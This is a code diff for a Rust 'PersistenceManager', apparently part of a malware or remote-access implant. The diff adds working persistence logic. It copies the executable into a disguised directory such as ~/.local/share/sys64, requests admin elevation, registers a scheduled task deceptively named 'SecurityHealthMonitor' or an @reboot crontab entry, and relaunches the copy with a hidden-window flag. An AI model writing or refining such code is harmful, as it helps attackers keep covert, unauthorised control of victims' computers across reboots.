@@ -8,16 +8,21 @@ impl PersistenceManager {
             Self::ensure_admin();
         }
 
-        // Install scheduled task / cron first (before copy_and_relaunch which exits)
+        // Step 1: Copy current exe to safe location (don't exit yet)
+        let target_exe = if let Some(path) = copy_to_path {
+            if !path.is_empty() {
+                Self::copy_exe_to_target()
+            } else { None }
+        } else { None };
+
+        // Step 2: Install scheduled task / cron — point to the copy if available
         if enable_persistence {
-            Self::install_persistence();
+            Self::install_persistence_at(target_exe.as_deref());
         }
 
-        // Copy to safe location and relaunch (exits process on success)
-        if let Some(path) = copy_to_path {
-            if !path.is_empty() {
-                Self::copy_and_relaunch(path);
-            }
+        // Step 3: Relaunch from the copy and exit
+        if let Some(ref target) = target_exe {
+            Self::relaunch_from(target);
         }
     }
 
@@ -48,7 +53,6 @@ impl PersistenceManager {
                     std::ptr::null(),
                     1, // SW_SHOWNORMAL
                 );
-                // result > 32 means success (ShellExecute returns instance handle)
                 if result as isize <= 32 {
                     eprintln!("[!] Failed to request admin elevation (code: {})", result as isize);
                 }
@@ -64,13 +68,11 @@ impl PersistenceManager {
         }
     }
 
-    fn copy_and_relaunch(_relative_path: &str) {
-        let current_exe = match std::env::current_exe() {
-            Ok(e) => e,
-            Err(_) => return,
-        };
-
-        let current_dir = current_exe.parent().unwrap_or(std::path::Path::new("."));
+    /// Copy current exe to the target location.
+    /// Returns the target exe path, or None if already at target or copy failed.
+    fn copy_exe_to_target() -> Option<std::path::PathBuf> {
+        let current_exe = std::env::current_exe().ok()?;
+        let current_dir = current_exe.parent()?;
 
         #[cfg(target_os = "windows")]
         let target_dir = {
@@ -83,9 +85,9 @@ impl PersistenceManager {
             std::path::PathBuf::from(home).join(".local/share").join("sys64")
         };
 
-        // If already running from target, skip
+        // Already at target — no need to copy again
         if current_dir.canonicalize().ok() == target_dir.canonicalize().ok() {
-            return;
+            return None;
         }
 
         #[cfg(target_os = "windows")]
@@ -100,17 +102,22 @@ impl PersistenceManager {
             std::process::exit(0);
         }
 
+        Some(target_exe)
+    }
+
+    /// Spawn the target exe with --boot and exit the current process.
+    fn relaunch_from(target_exe: &std::path::Path) -> ! {
         #[cfg(target_os = "windows")]
         {
             use std::os::windows::process::CommandExt;
-            let _ = std::process::Command::new(&target_exe)
+            let _ = std::process::Command::new(target_exe)
                 .arg("--boot")
                 .creation_flags(0x08000000)
                 .spawn();
         }
         #[cfg(not(target_os = "windows"))]
         {
-            let _ = std::process::Command::new(&target_exe)
+            let _ = std::process::Command::new(target_exe)
                 .arg("--boot")
                 .spawn();
         }
@@ -118,19 +125,22 @@ impl PersistenceManager {
         std::process::exit(0);
     }
 
-    fn install_persistence() {
+    fn install_persistence_at(target_override: Option<&std::path::Path>) {
         #[cfg(target_os = "windows")]
-        Self::install_windows_task();
+        Self::install_windows_task(target_override);
         #[cfg(not(target_os = "windows"))]
-        Self::install_linux_cron();
+        Self::install_linux_cron(target_override);
     }
 
     #[cfg(target_os = "windows")]
-    fn install_windows_task() {
+    fn install_windows_task(target_override: Option<&std::path::Path>) {
         use std::os::windows::process::CommandExt;
-        let exe = match std::env::current_exe() {
-            Ok(e) => e.to_string_lossy().to_string(),
-            Err(_) => return,
+        let exe = match target_override {
+            Some(p) => p.to_string_lossy().to_string(),
+            None => match std::env::current_exe() {
+                Ok(e) => e.to_string_lossy().to_string(),
+                Err(_) => return,
+            },
         };
         let task_name = "SecurityHealthMonitor";
         let _ = std::process::Command::new("schtasks.exe")
@@ -145,10 +155,13 @@ impl PersistenceManager {
     }
 
     #[cfg(not(target_os = "windows"))]
-    fn install_linux_cron() {
-        let exe = match std::env::current_exe() {
-            Ok(e) => e.to_string_lossy().to_string(),
-            Err(_) => return,
+    fn install_linux_cron(target_override: Option<&std::path::Path>) {
+        let exe = match target_override {
+            Some(p) => p.to_string_lossy().to_string(),
+            None => match std::env::current_exe() {
+                Ok(e) => e.to_string_lossy().to_string(),
+                Err(_) => return,
+            },
         };
         let cron_line = format!("@reboot {} >/dev/null 2>&1", exe);
         let cmd = format!("(crontab -l 2>/dev/null; echo '{}') | crontab -", cron_line);
